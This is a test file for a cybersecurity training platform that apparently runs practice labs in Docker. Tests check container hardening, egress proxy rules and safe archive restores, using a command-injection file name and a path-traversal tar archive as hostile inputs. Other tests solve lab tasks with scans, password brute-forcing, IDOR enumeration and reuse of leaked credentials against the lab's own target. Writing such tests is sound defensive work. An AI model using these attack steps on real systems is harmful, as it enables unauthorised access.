"""End-to-end tests against a real Docker Engine.

Run with: CYBERLAB_DOCKER_TESTS=1 pytest tests/test_docker_integration.py
Optional: CYBERLAB_TEST_IMAGE_MIRROR=mirror.gcr.io (avoids Docker Hub rate limits).
Optional: CYBERLAB_TEST_DOCKER_HOST=ssh://user@host runs every test through the SSH transport
(the test helpers themselves use the local docker CLI, so it must be the same engine).
"""

import os
import subprocess
import time

import pytest
from fastapi.testclient import TestClient

from cyberlab.main import create_app

from .conftest import REPO, auth

pytestmark = pytest.mark.skipif(
    os.environ.get("CYBERLAB_DOCKER_TESTS") != "1", reason="set CYBERLAB_DOCKER_TESTS=1"
)
YAML = {"Content-Type": "application/yaml"}
MINIMAL = (REPO / "examples" / "manifests" / "minimal.universe.yaml").read_text()
# Same environment without tool packs: still a built image (with the cyberlab user), but
# no package downloads, so it also works on hosts without internet access for builds.
BASIC = MINIMAL.replace("toolPacks: [crypto]", "toolPacks: []")
assert BASIC != MINIMAL
LAB = """
apiVersion: cyberlab.dev/v1alpha1
kind: Universe
metadata: {name: lab-pair}
spec:
  environments:
    - {name: alpha, baseImage: debian-12, resources: {cpu: 0.25, memoryMiB: 256, storageGiB: 1}}
    - {name: beta, baseImage: debian-12, resources: {cpu: 0.25, memoryMiB: 256, storageGiB: 1}}
"""


def sh(container, cmd, interpreter="sh"):
    p = subprocess.run(
        ["docker", "exec", container, interpreter, "-c", cmd],
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    return p.returncode, (p.stdout + p.stderr).strip()


def docker(*args):
    return subprocess.run(
        ["docker", *args],
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


@pytest.fixture
def client(settings):
    s = settings.model_copy(
        update={
            "execution_provider": "docker",
            "image_mirror": os.environ.get("CYBERLAB_TEST_IMAGE_MIRROR") or None,
            # e.g. ssh://runner@localhost: run every test through CyberLab's SSH transport
            "docker_host": os.environ.get("CYBERLAB_TEST_DOCKER_HOST") or None,
        }
    )
    with TestClient(create_app(s)) as c:
        yield c


def provision(client, manifest, name):
    ws = client.post("/v1/workspaces", json={"name": name}, headers=auth()).json()["id"]
    client.put(f"/v1/workspaces/{ws}/manifest", content=manifest, headers=YAML | auth())
    r = client.post(f"/v1/workspaces/{ws}/environments", json={}, headers=auth())
    assert r.status_code == 201, r.text
    envs = r.json()["environments"]
    assert all(e["state"] == "running" for e in envs), envs
    return ws, envs


def destroy_all(client, ws, envs, keep=False):
    for e in envs:
        client.delete(
            f"/v1/workspaces/{ws}/environments/{e['id']}?keep_workspace={keep}", headers=auth()
        )
    client.delete(f"/v1/workspaces/{ws}", headers=auth())


def test_provider_connected(client):
    st = client.get("/v1/system/execution", headers=auth()).json()
    assert st["connected"] is True and st["status"] == "CONNECTED"


def test_minimal_environment_is_isolated_and_hardened(client):
    ws, (env,) = provision(client, BASIC, "it-minimal")
    name = env["resources"]["container"]
    try:
        assert sh(name, "id -u")[1] == "1000"
        assert sh(name, "whoami")[1] == "cyberlab"  # real user, not "I have no name!"
        assert "CapEff:\t0000000000000000" in sh(name, "cat /proc/self/status")[1]
        assert "NoNewPrivs:\t1" in sh(name, "cat /proc/self/status")[1]
        assert sh(name, "touch /etc/x")[0] != 0  # read-only root filesystem
        assert sh(name, "echo hi > /workspace/note.txt")[0] == 0
        # isolated: loopback only
        assert sh(name, "ls /sys/class/net")[1].split() == ["lo"]
        mem = docker("inspect", "--format", "{{.HostConfig.Memory}}", name).stdout.strip()
        assert mem == str(512 * 1024 * 1024)

        # stop/start keeps the workspace volume
        base = f"/v1/workspaces/{ws}/environments/{env['id']}"
        assert client.post(f"{base}/stop", headers=auth()).json()["state"] == "stopped"
        assert client.post(f"{base}/start", headers=auth()).json()["state"] == "running"
        assert sh(name, "cat /workspace/note.txt")[1] == "hi"
    finally:
        destroy_all(client, ws, [env])
    assert docker("inspect", name).returncode != 0  # container gone
    assert docker("volume", "inspect", env["resources"]["volume"]).returncode != 0


def test_lab_network_connects_peers_but_not_internet(client):
    ws, envs = provision(client, LAB, "it-lab")
    a = envs[0]["resources"]["container"]
    try:
        code, out = sh(a, "getent hosts beta")
        assert code == 0 and out, "peer should resolve on the lab network"
        assert sh(a, "getent hosts example.com")[0] != 0, "internet must not resolve"
        internal = docker(
            "network", "inspect", "--format", "{{.Internal}}", envs[0]["resources"]["network"]
        ).stdout.strip()
        assert internal == "true"
    finally:
        destroy_all(client, ws, envs)
    # destroying the last environment removes the lab network
    assert docker("network", "inspect", envs[0]["resources"]["network"]).returncode != 0


def _read_until(ws, needle: bytes, limit: int = 200) -> bytes:
    buf = b""
    for _ in range(limit):
        buf += ws.receive_bytes()
        if needle in buf:
            return buf
    raise AssertionError(f"{needle!r} not seen in {buf[-500:]!r}")


def test_browser_terminal_on_real_container(client):
    import json

    ws_id, (env,) = provision(client, BASIC, "it-terminal")
    try:
        r = client.post(f"/v1/workspaces/{ws_id}/environments/{env['id']}/terminal", headers=auth())
        assert r.status_code == 201, r.text
        with client.websocket_connect("/v1/terminal") as ws:
            ws.send_text(json.dumps({"type": "auth", "ticket": r.json()["ticket"]}))
            assert json.loads(ws.receive_text())["type"] == "ready"
            ws.send_text(json.dumps({"type": "resize", "rows": 33, "cols": 111}))
            ws.send_text(
                json.dumps(
                    {
                        "type": "input",
                        "data": "echo uid=$(id -u) size=$(stty size | tr ' ' x) pwd=$PWD; "
                        "echo persisted > /workspace/from-terminal.txt; echo DONE-$((40+2))\n",
                    }
                )
            )
            out = _read_until(ws, b"DONE-42")
            assert b"uid=1000" in out and b"size=33x111" in out and b"pwd=/workspace" in out
            ws.send_text(json.dumps({"type": "input", "data": "exit\n"}))
            for _ in range(200):  # skip remaining shell output (prompt etc.)
                msg = ws.receive()
                if msg.get("text"):
                    assert json.loads(msg["text"]) == {"type": "exit", "reason": "exit"}
                    break
            else:
                raise AssertionError("no exit message")
        name = env["resources"]["container"]
        assert sh(name, "cat /workspace/from-terminal.txt")[1] == "persisted"
    finally:
        destroy_all(client, ws_id, [env])


@pytest.mark.skipif(
    os.environ.get("CYBERLAB_DOCKER_BUILD_TESTS") != "1",
    reason="installs packages; needs internet access during image builds",
)
def test_tool_pack_is_installed(client):
    ws, (env,) = provision(client, MINIMAL, "it-crypto")  # crypto pack on debian-12
    name = env["resources"]["container"]
    try:
        assert env["toolPacksInstalled"] is True and env["image"].startswith("cyberlab-env:")
        for cmd in ["openssl version", "gpg --version", "age --version"]:
            code, out = sh(name, cmd)
            assert code == 0, (cmd, out)
        # the tools work for the unprivileged user inside the hardened container
        code, out = sh(
            name,
            "age-keygen -o /workspace/key.txt 2>/dev/null; "
            "grep -c AGE-SECRET-KEY /workspace/key.txt",
        )
        assert (code, out) == (0, "1")
    finally:
        destroy_all(client, ws, [env])


EGRESS = """
apiVersion: cyberlab.dev/v1alpha1
kind: Universe
metadata: {name: egress}
spec:
  environments:
    - name: scanner
      baseImage: debian-12
      resources: {cpu: 0.5, memoryMiB: 512, storageGiB: 2}
      network: {mode: restricted-egress, allowedEgress: [allowed.example]}
"""


# bash-only HTTP request through the proxy (the base image has no curl).
def bash(container, cmd):
    return sh(container, cmd, interpreter="bash")


def proxy_get(host: str, with_auth: bool = True) -> str:
    auth_line = "Proxy-Authorization: Basic %s\\r\\n" if with_auth else "%.0s"
    return _PROXY_GET.replace("HOST", host).replace("AUTH", auth_line)


_PROXY_GET = (
    "exec 3<>/dev/tcp/egress-proxy/3128 || exit 9; "
    'cred=$(printf %s "$(printf %s "${HTTP_PROXY#http://}" | cut -d@ -f1)" | base64 -w0); '
    "printf 'GET http://HOST/ HTTP/1.0\\r\\nHost: HOST\\r\\nAUTH\\r\\n' \"$cred\" >&3; "
    "head -1 <&3"
)


def test_restricted_egress_through_proxy(settings):
    s = settings.model_copy(
        update={
            "execution_provider": "docker",
            "image_mirror": os.environ.get("CYBERLAB_TEST_IMAGE_MIRROR") or None,
            # e.g. ssh://runner@localhost: run every test through CyberLab's SSH transport
            "docker_host": os.environ.get("CYBERLAB_TEST_DOCKER_HOST") or None,
            "egress_allow_private": True,  # the fake "internet" below uses private addresses
        }
    )
    mirror = os.environ.get("CYBERLAB_TEST_IMAGE_MIRROR")
    py = f"{mirror}/library/python:3.13-slim" if mirror else "python:3.13-slim"
    with TestClient(create_app(s)) as c:
        ws, (env,) = provision(c, EGRESS, "it-egress")
        name = env["resources"]["container"]
        key = name.removeprefix("cyberlab-").removesuffix("-scanner")
        sites = []
        try:
            for host in ("allowed.example", "blocked.example"):
                site = f"cyberlab-test-site-{host.split('.')[0]}-{key}"
                r = docker(
                    "run",
                    "-d",
                    "--name",
                    site,
                    "--network",
                    f"cyberlab-{key}-egress",
                    "--network-alias",
                    host,
                    py,
                    "python",
                    "-m",
                    "http.server",
                    "80",
                )
                assert r.returncode == 0, r.stderr
                sites.append(site)
            for _ in range(30):  # wait for the fake sites to listen
                if (
                    "200"
                    in bash(
                        name,
                        proxy_get("allowed.example"),
                    )[1]
                ):
                    break
                time.sleep(0.5)

            ok = bash(
                name,
                proxy_get("allowed.example"),
            )[1]
            assert ok.startswith("HTTP/1.0 200"), ok
            denied = bash(
                name,
                proxy_get("blocked.example"),
            )[1]
            assert denied.startswith("HTTP/1.1 403"), denied
            no_auth = bash(name, proxy_get("allowed.example", with_auth=False))[1]
            assert no_auth.startswith("HTTP/1.1 407"), no_auth
            # no way around the proxy: direct connections fail
            direct = sh(
                name,
                "timeout 5 bash -c 'exec 3<>/dev/tcp/allowed.example/80' "
                "&& echo CONNECTED || echo BLOCKED",
            )[1]
            assert "BLOCKED" in direct and "CONNECTED" not in direct, direct

            log = c.get(f"/v1/workspaces/{ws}/egress-log", headers=auth()).json()
            decisions = {(e["decision"], e.get("host"), e.get("reason")) for e in log}
            assert ("allow", "allowed.example", None) in decisions
            assert ("deny", "blocked.example", "not-allowed") in decisions
            assert ("deny", None, "auth") in decisions
        finally:
            for site in sites:
                docker("rm", "-f", site)
            destroy_all(c, ws, [env])
    assert docker("inspect", f"cyberlab-{key}-egress-proxy").returncode != 0
    assert docker("network", "inspect", f"cyberlab-{key}-egress").returncode != 0


def test_workspace_files_on_real_container(client):
    ws, (env,) = provision(client, BASIC, "it-files")
    name = env["resources"]["container"]
    base = f"/v1/workspaces/{ws}/environments/{env['id']}/files"
    blob = bytes(range(256)) * 64  # binary data, 16 KiB
    odd = "odd name; $(touch pwned) & co.txt"
    try:
        r = client.put(
            f"{base}/content",
            params={"path": "captures/day1/data.bin"},
            content=blob,
            headers=auth(),
        )
        assert r.status_code == 201, r.text
        # written by the environment's own user, not root
        assert sh(name, "stat -c %U:%G /workspace/captures/day1/data.bin")[1] == "cyberlab:cyberlab"
        r = client.put(f"{base}/content", params={"path": odd}, content=b"hi", headers=auth())
        assert r.status_code == 201
        assert sh(name, "ls /workspace")[1].splitlines() == ["captures", odd]  # no "pwned"

        root = client.get(base, headers=auth()).json()["entries"]
        assert [(e["name"], e["type"]) for e in root] == [("captures", "directory"), (odd, "file")]
        nested = client.get(base, params={"path": "captures/day1"}, headers=auth()).json()
        assert nested["entries"][0]["size"] == len(blob)

        dl = client.get(
            f"{base}/content", params={"path": "captures/day1/data.bin"}, headers=auth()
        )
        assert dl.status_code == 200 and dl.content == blob

        # a file created in the terminal is visible through the API too
        sh(name, "echo from-terminal > /workspace/t.txt")
        assert (
            client.get(f"{base}/content", params={"path": "t.txt"}, headers=auth()).content
            == b"from-terminal\n"
        )

        assert (
            client.get(f"{base}/content", params={"path": "captures"}, headers=auth()).status_code
            == 409
        )  # a directory
        assert client.get(base, params={"path": "missing"}, headers=auth()).status_code == 404
        assert (
            client.delete(base, params={"path": "captures"}, headers=auth()).status_code == 409
        )  # needs recursive
        assert (
            client.delete(
                base, params={"path": "captures", "recursive": True}, headers=auth()
            ).status_code
            == 204
        )
        assert sh(name, "test -e /workspace/captures && echo yes || echo no")[1] == "no"

        client.post(f"/v1/workspaces/{ws}/environments/{env['id']}/stop", headers=auth())
        assert client.get(base, headers=auth()).status_code == 409
    finally:
        destroy_all(client, ws, [env])


def test_snapshot_and_restore_on_real_container(client, tmp_path):
    import io
    import tarfile

    ws, (env,) = provision(client, BASIC, "it-snap")
    name, vol = env["resources"]["container"], env["resources"]["volume"]
    envbase = f"/v1/workspaces/{ws}/environments/{env['id']}"
    try:
        sh(
            name,
            "mkdir -p /workspace/notes && echo v1 > /workspace/notes/a.txt "
            "&& printf 'bin' > /workspace/b.bin",
        )
        r = client.post(f"{envbase}/snapshots", json={"label": "v1"}, headers=auth())
        assert r.status_code == 201, r.text
        snap = r.json()
        assert snap["sizeBytes"] > 0

        sh(
            name,
            "echo v2 > /workspace/notes/a.txt && rm /workspace/b.bin && touch /workspace/new.txt",
        )
        r = client.post(f"{envbase}/restore", json={"snapshotId": snap["id"]}, headers=auth())
        assert r.status_code == 409  # still running

        client.post(f"{envbase}/stop", headers=auth())
        r = client.post(f"{envbase}/restore", json={"snapshotId": snap["id"]}, headers=auth())
        assert r.status_code == 200, r.text
        client.post(f"{envbase}/start", headers=auth())
        assert sh(name, "cat /workspace/notes/a.txt")[1] == "v1"
        assert sh(name, "cat /workspace/b.bin")[1] == "bin"
        assert sh(name, "ls -A /workspace")[1].split() == ["b.bin", "notes"]  # new.txt gone
        assert sh(name, "stat -c %U /workspace/notes/a.txt")[1] == "cyberlab"

        # Hostile and corrupt archives change nothing and write nothing outside.
        adapter = client.app.state.provider
        image = env["resources"]["image"]
        client.post(f"{envbase}/stop", headers=auth())
        corrupt = tmp_path / "corrupt.tar.gz"
        corrupt.write_bytes(b"\x1f\x8b not really gzip")
        with pytest.raises(Exception, match="restore failed"):
            adapter.import_workspace(vol, image, str(corrupt))
        crafted = tmp_path / "crafted.tar.gz"
        with tarfile.open(crafted, "w:gz") as tar:
            for member in ["../escape.txt", "/etc/evil.txt", "ok.txt"]:
                data = b"x"
                info = tarfile.TarInfo(member)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        # GNU tar refuses the '..' member and exits non-zero, so the whole restore is refused.
        with pytest.raises(Exception, match="restore failed"):
            adapter.import_workspace(vol, image, str(crafted))
        client.post(f"{envbase}/start", headers=auth())
        listing = sh(name, "ls -A /workspace")[1].split()
        assert "escape.txt" not in listing
        assert sh(name, "test -e /escape.txt && echo yes || echo no")[1] == "no"
        assert sh(name, "test -e /etc/evil.txt && echo yes || echo no")[1] == "no"
        assert "ok.txt" not in listing  # nothing from the refused archive was applied
        assert sh(name, "cat /workspace/notes/a.txt")[1] == "v1"  # workspace intact
        assert ".cyberlab-restore" not in listing

        r = client.delete(f"/v1/workspaces/{ws}/snapshots/{snap['id']}", headers=auth())
        assert r.status_code == 204
    finally:
        destroy_all(client, ws, [env])


DESKTOP = """
apiVersion: cyberlab.dev/v1alpha1
kind: Universe
metadata: {name: desk}
spec:
  environments:
    - name: gui
      baseImage: ubuntu-24-04
      resources: {cpu: 1, memoryMiB: 2048, storageGiB: 4}
      network: {mode: isolated}
      access: {desktop: true}
"""


@pytest.mark.skipif(
    os.environ.get("CYBERLAB_DOCKER_BUILD_TESTS") != "1",
    reason="installs desktop packages; needs internet access during image builds",
)
def test_remote_desktop_vnc_handshake_on_real_container(client):
    """The whole path: API ticket -> WebSocket -> docker exec -> x11vnc in a hardened,
    network-less container. Completes a VNC handshake and reads the screen size."""
    import json

    ws_id, (env,) = provision(client, DESKTOP, "it-desktop")
    name = env["resources"]["container"]
    try:
        assert env["desktop"] is True
        for _attempt in range(2):  # the second connection reuses the running desktop
            r = client.post(
                f"/v1/workspaces/{ws_id}/environments/{env['id']}/desktop", headers=auth()
            )
            assert r.status_code == 201, r.text
            with client.websocket_connect("/v1/desktop") as sock:
                sock.send_text(json.dumps({"type": "auth", "ticket": r.json()["ticket"]}))
                assert json.loads(sock.receive_text())["type"] == "ready"
                buf = b""

                def need(n):
                    nonlocal buf
                    while len(buf) < n:
                        buf += sock.receive_bytes()
                    out, buf = buf[:n], buf[n:]
                    return out

                assert need(12) == b"RFB 003.008\n"
                sock.send_bytes(b"RFB 003.008\n")
                count = need(1)[0]
                assert 1 in need(count)  # "None": the ticket is the authentication
                sock.send_bytes(bytes([1]))
                assert need(4) == b"\0\0\0\0"  # security handshake OK
                sock.send_bytes(bytes([1]))  # ClientInit (shared)
                width, height = int.from_bytes(need(2), "big"), int.from_bytes(need(2), "big")
                assert (width, height) == (1280, 800)
        # the desktop runs as the unprivileged user, and nothing listens on a TCP port
        code, out = sh(name, "ps -o user= -C Xvfb,x11vnc,openbox | sort -u")
        assert out == "cyberlab", out
        code, out = sh(name, "cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | awk '$4==\"0A\"'")
        assert out == "", f"something is listening: {out}"
    finally:
        destroy_all(client, ws_id, [env])


def test_troubleshooter_explains_out_of_memory(client):
    ws_id, (env,) = provision(client, BASIC, "it-oom")
    name = env["resources"]["container"]
    try:
        url = f"/v1/workspaces/{ws_id}/environments/{env['id']}/diagnose"
        assert client.get(url, headers=auth()).json()["advice"][0]["code"] == "state.running"
        code, _ = sh(name, "tail /dev/zero")  # eats all memory until the kernel kills it
        assert code == 137
        body = client.get(url, headers=auth()).json()
        assert body["advice"][0]["code"] == "runtime.out-of-memory", body
        assert body["state"] == "running"  # only the program was killed
    finally:
        destroy_all(client, ws_id, [env])


def _build_test_deb(tmp_path) -> bytes:
    """A real, tiny .deb (built with dpkg-deb) that installs /usr/local/bin/cyberlab-hello."""
    image = f"{os.environ.get('CYBERLAB_TEST_IMAGE_MIRROR', 'docker.io')}/library/debian:12-slim"
    script = (
        "set -e; mkdir -p /p/DEBIAN /p/usr/local/bin; "
        "printf 'Package: cyberlab-hello\\nVersion: 1.0\\nArchitecture: all\\n"
        "Maintainer: test <test@example.com>\\nDescription: test package\\n' > /p/DEBIAN/control; "
        "printf '#!/bin/sh\\necho hello-from-my-package\\n' > /p/usr/local/bin/cyberlab-hello; "
        "chmod 755 /p/usr/local/bin/cyberlab-hello; dpkg-deb --build /p /out/hello.deb; "
        "chmod 644 /out/hello.deb"
    )
    p = subprocess.run(
        ["docker", "run", "--rm", "-v", f"{tmp_path}:/out", image, "sh", "-c", script],
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    assert p.returncode == 0, p.stderr
    return (tmp_path / "hello.deb").read_bytes()


def test_install_your_own_package(client, tmp_path):
    ws_id, (env,) = provision(client, BASIC, "it-install")
    base = f"/v1/workspaces/{ws_id}/environments/{env['id']}"
    try:
        deb = _build_test_deb(tmp_path)
        files = f"{base}/files/content"
        up = client.put(files, params={"path": "installers/hello.deb"}, content=deb, headers=auth())
        assert up.status_code == 201, up.text
        client.put(files, params={"path": "notes.txt"}, content=b"keep me", headers=auth())
        # not a package: refused before anything is built
        bad = client.post(f"{base}/install", json={"path": "notes.txt"}, headers=auth())
        assert bad.status_code == 422
        r = client.post(f"{base}/install", json={"path": "installers/hello.deb"}, headers=auth())
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["state"] == "running"
        assert body["installed"][0]["path"] == "/workspace/installers/hello.deb"
        name = body["resources"]["container"]
        assert sh(name, "cyberlab-hello") == (0, "hello-from-my-package")
        assert sh(name, "cat /workspace/notes.txt") == (0, "keep me")  # files kept
        assert sh(name, "id -u") == (0, "1000")  # still unprivileged
        info = docker("inspect", "--format", "{{.HostConfig.ReadonlyRootfs}}", name).stdout.strip()
        assert info == "true"  # still read-only
    finally:
        destroy_all(client, ws_id, [env])


def test_ready_made_lab_on_real_container(client):
    """One click starts the Linux lab: the files are really there, owned by the learner,
    the flags the learner reads with ordinary commands are accepted, and the machine has
    no network."""
    import re

    r = client.post("/v1/labs/linux-first-steps/start", headers=auth())
    assert r.status_code == 201, r.text
    out = r.json()
    ws = out["workspaceId"]
    envs = client.get(f"/v1/workspaces/{ws}/environments", headers=auth()).json()
    try:
        assert out["setupError"] is None, out["setupError"]
        name = envs[0]["resources"]["container"]

        def flag(cmd):
            code, text = sh(name, cmd)
            assert code == 0, text
            return re.search(r"CL\{[0-9a-f]{16}\}", text).group()

        answers = {
            "read-a-file": flag("cat welcome.txt"),
            "hidden-file": flag("ls -a | grep -q secret && cat .secret-note.txt"),
            "find-a-file": flag("cat $(find maze -name treasure.txt)"),
            "search-a-file": flag("grep -i flag logs/app.log"),
        }
        for task, value in answers.items():
            res = client.post(
                f"/v1/workspaces/{ws}/lab/answer",
                json={"task": task, "answer": value},
                headers=auth(),
            ).json()
            assert res["correct"] is True, task
        assert res["progress"] == {"solved": 4, "total": 4}
        code, owner = sh(name, "stat -c %U welcome.txt maze logs/app.log | sort -u")
        assert owner == "cyberlab", owner
        code, net = sh(name, "ls /sys/class/net | grep -v '^lo$' || true")
        assert net == "", f"the lab machine has a network: {net}"
    finally:
        destroy_all(client, ws, envs)


TARGET_PAIR = """apiVersion: cyberlab.dev/v1alpha1
kind: Universe
metadata: {name: it-target}
spec:
  environments:
    - name: attacker
      baseImage: ubuntu-24-04
      resources: {cpu: 0.5, memoryMiB: 512, storageGiB: 2}
      network: {mode: lab}
    - name: target
      role: target
      baseImage: lab-target
      resources: {cpu: 0.25, memoryMiB: 128, storageGiB: 1}
      network: {mode: lab}
      access: {terminal: false}
"""


def test_practice_target_on_real_containers(client):
    """A practice target serves its config on low ports, unprivileged, and the attacker
    reaches it by name on the private lab network (bash /dev/tcp, no tools needed)."""
    import json as _json

    ws, envs = provision(client, TARGET_PAIR, "it-target")
    by = {e["name"]: e["resources"]["container"] for e in envs}
    try:
        config = {
            "services": [
                {"port": 22, "kind": "banner", "banner": "SSH-2.0-OpenSSH_9.6p1 it"},
                {"port": 80, "kind": "http", "routes": {"/": {"body": "it-works"}}},
                {"port": 31337, "kind": "banner", "banner": "hidden-it"},
            ]
        }
        data = _json.dumps(config).replace("'", "")
        code, out = sh(by["target"], f"echo '{data}' > /workspace/.cyberlab-target.json")
        assert code == 0, out
        probe = (
            "for i in $(seq 1 40); do "
            "(exec 3<>/dev/tcp/target/22) 2>/dev/null && break; sleep 0.5; done; "
            "timeout 5 cat < /dev/tcp/target/22; "
            "exec 3<>/dev/tcp/target/80; printf 'GET / HTTP/1.0\\r\\n\\r\\n' >&3; "
            "timeout 5 cat <&3; "
            "timeout 5 cat < /dev/tcp/target/31337"
        )
        code, out = sh(by["attacker"], probe, interpreter="bash")
        assert "SSH-2.0-OpenSSH_9.6p1 it" in out, out
        assert "it-works" in out and "hidden-it" in out, out
        code, who = sh(by["target"], "ps -o user= -p 1 2>/dev/null || stat -c %U /proc/1")
        assert "1000" in who or "cyberlab" in who, who
        # the target has no route out: its only network is the internal lab network
        code, out = sh(
            by["target"],
            "python3 -c \"import socket; socket.create_connection(('1.1.1.1', 53), 3)\"",
        )
        assert code != 0
    finally:
        destroy_all(client, ws, envs)


@pytest.mark.skipif(
    os.environ.get("CYBERLAB_DOCKER_BUILD_TESTS") != "1",
    reason="installs nmap and curl; needs internet access during image builds",
)
@pytest.mark.parametrize("lab", ["network-scanning", "web-secrets"])
def test_target_labs_end_to_end(client, lab):
    """The real labs: solve every task with the tools the hints suggest."""
    import re

    out = client.post(f"/v1/labs/{lab}/start", headers=auth()).json()
    ws = out["workspaceId"]
    envs = client.get(f"/v1/workspaces/{ws}/environments", headers=auth()).json()
    try:
        assert out.get("setupError") is None, out
        attacker = next(e for e in envs if e["name"] == "attacker")["resources"]["container"]
        wait = (
            "for i in $(seq 1 60); do "
            "(exec 3<>/dev/tcp/target/22) 2>/dev/null && break; sleep 0.5; done"
        )
        sh(attacker, wait, interpreter="bash")
        answers = {}
        if lab == "network-scanning":
            _, scan = sh(attacker, "nmap -Pn -sV target")
            answers["web-port"] = re.search(r"^(\d+)/tcp\s+open\s+http\s", scan, re.M).group(1)
            _, ver = sh(attacker, "nmap -Pn -sV -p 22 target")
            answers["ssh-version"] = re.search(r"OpenSSH[ _]([0-9.]+p\d)", ver).group(1)
            _, full = sh(attacker, "nmap -Pn -p- --min-rate 2000 target")
            ports = re.findall(r"^(\d+)/tcp\s+open", full, re.M)
            hidden = next(p for p in ports if int(p) > 10000)
            answers["hidden-port"] = hidden
            _, banner = sh(attacker, f"timeout 5 nc target {hidden} </dev/null")
            answers["banner-flag"] = re.search(r"CL\{[0-9a-f]{16}\}", banner).group()
        else:
            _, home = sh(attacker, "curl -s http://target/")
            answers["source-flag"] = re.search(r"CL\{[0-9a-f]{16}\}", home).group()
            _, robots = sh(attacker, "curl -s http://target/robots.txt")
            path = re.search(r"Disallow: (\S+)", robots).group(1)
            _, page = sh(attacker, f"curl -sL http://target{path}")
            answers["robots-flag"] = re.search(r"CL\{[0-9a-f]{16}\}", page).group()
            loop = (
                'for i in $(seq 1 100); do curl -s "http://target/api/notes?id=$i"; echo; done'
                " | grep admin"
            )
            _, note = sh(attacker, loop)
            answers["idor-flag"] = re.search(r"CL\{[0-9a-f]{16}\}", note).group()
        for task, value in answers.items():
            r = client.post(
                f"/v1/workspaces/{ws}/lab/answer",
                json={"task": task, "answer": value},
                headers=auth(),
            ).json()
            assert r["correct"] is True, (task, value)
        assert r["progress"]["solved"] == r["progress"]["total"]
    finally:
        destroy_all(client, ws, envs)


def _solve(client, lab, solver):
    """Start a lab, let `solver(sh_in_machine)` find the answers, check them all."""
    out = client.post(f"/v1/labs/{lab}/start", headers=auth()).json()
    ws = out["workspaceId"]
    envs = client.get(f"/v1/workspaces/{ws}/environments", headers=auth()).json()
    try:
        assert out.get("setupError") is None, out
        boxes = {e["name"]: e["resources"]["container"] for e in envs}
        me = next(n for n in boxes if n != "target")

        def run(cmd):
            code, text = sh(boxes[me], cmd, interpreter="bash")
            return text

        answers = solver(run)
        for task, value in answers.items():
            r = client.post(
                f"/v1/workspaces/{ws}/lab/answer",
                json={"task": task, "answer": value},
                headers=auth(),
            ).json()
            assert r["correct"] is True, (lab, task, value)
        assert r["progress"]["solved"] == r["progress"]["total"]
    finally:
        destroy_all(client, ws, envs)


FLAG = r"CL\{[0-9a-f]{16}\}"


def test_linux_labs_solved_with_the_hinted_commands(client):
    """No tool packs needed: the hints' commands work on a plain Ubuntu machine."""
    import re

    def crypto(run):
        wanted = run("tail -1 puzzles/WANTED.txt")
        leaked = run(f"sha256sum puzzles/reports/* | grep {wanted}").split("/")[-1]
        return {
            "base64-flag": re.search(FLAG, run("base64 -d puzzles/message.b64")).group(),
            "hex-flag": re.search(FLAG, run("basenc --base16 -d puzzles/message.hex")).group(),
            "rot13-flag": re.search(
                FLAG, run("tr 'A-Za-z' 'N-ZA-Mn-za-m' < puzzles/message.rot13")
            ).group(),
            "leaked-file": leaked,
        }

    def perms(run):
        assert "Permission denied" in run("./perms/hello.sh")
        assert "Permission denied" in run("cat perms/locked.txt")
        # exact bits survive unpacking, whatever the umask
        assert run("stat -c %a perms/locked.txt perms/hello.sh").split() == ["0", "644"]
        assert "666" in run("stat -c %a perms/configs/*").split()
        return {
            "run-flag": re.search(FLAG, run("chmod +x perms/hello.sh && ./perms/hello.sh")).group(),
            "locked-flag": re.search(
                FLAG, run("chmod u+r perms/locked.txt && cat perms/locked.txt")
            ).group(),
            "risky-file": run("find perms/configs -perm -o+w").split("/")[-1],
        }

    def incident(run):
        ip = run("awk '$9 == 404 {print $1}' access.log | sort | uniq -c | sort -n | tail -1")
        ip = ip.split()[-1]
        tool = run(f"grep '^{ip} ' access.log | awk -F'\"' '{{print $6}}' | sort | uniq -c")
        tool = next(line.split()[-1] for line in tool.splitlines() if "/" in line.split()[-1])
        shell = run("grep 'cmd=' access.log | head -1 | awk '{print $7}'").split("?")[0]
        return {"scanner-ip": ip, "scanner-tool": tool.split("/")[0], "webshell-path": shell}

    _solve(client, "crypto-basics", crypto)
    _solve(client, "linux-permissions", perms)
    _solve(client, "incident-response-web", incident)


@pytest.mark.skipif(
    os.environ.get("CYBERLAB_DOCKER_BUILD_TESTS") != "1",
    reason="installs curl, nmap and binwalk; needs internet access during image builds",
)
def test_intermediate_and_advanced_labs_end_to_end(client):
    import re

    wait = (
        "for i in $(seq 1 60); do (exec 3<>/dev/tcp/target/22) 2>/dev/null && break; "
        "(exec 3<>/dev/tcp/target/80) 2>/dev/null && break; sleep 0.5; done"
    )

    def logins(run):
        run(wait)
        admin = re.search(r"Ask our (\w+) at", run("curl -s http://target/")).group(1)
        loop = (
            'while read p; do echo "PASS $p"; '
            f'curl -s "http://target/login?user={admin}&password=$p"; echo; '
            "done < passwords.txt | grep -B1 Welcome"
        )
        key = re.search(r"API_KEY = '(\w+)'", run("curl -s http://target/static/app.js")).group(1)
        return {
            "admin-user": admin,
            "login-flag": re.search(FLAG, run(loop)).group(),
            "key-flag": re.search(
                FLAG, run(f'curl -s "http://target/api/fleet?key={key}"')
            ).group(),
        }

    def chain(run):
        run(wait)
        scan = run("nmap -Pn -p- --min-rate 2000 target")
        port = next(p for p in re.findall(r"^(\d+)/tcp\s+open", scan, re.M) if p != "22")
        backup = re.search(r"moved to (\S+)", run(f"curl -s http://target:{port}/")).group(1)
        creds = dict(
            line.split("=", 1)
            for line in run(f"curl -s http://target:{port}{backup}").splitlines()
            if "=" in line
        )
        u, p = creds["service_user"], creds["service_password"]
        token = re.search(
            r'"token": "(\w+)"',
            run(f'curl -s "http://target:{port}/api/token?user={u}&password={p}"'),
        ).group(1)
        flag = re.search(FLAG, run(f'curl -s "http://target:{port}/api/admin/flag?token={token}"'))
        return {"web-port": port, "service-user": u, "chain-flag": flag.group()}

    def forensics(run):
        note = re.search(FLAG, run("grep -a -o 'note: CL{[0-9a-f]*}' evidence.png")).group()
        scan = run("binwalk evidence.png")
        offset = re.search(r"^(\d+)\s+0x[0-9A-F]+\s+gzip", scan, re.M | re.I).group(1)
        carved = run(f"tail -c +{int(offset) + 1} evidence.png | gunzip")
        return {
            "note-flag": note,
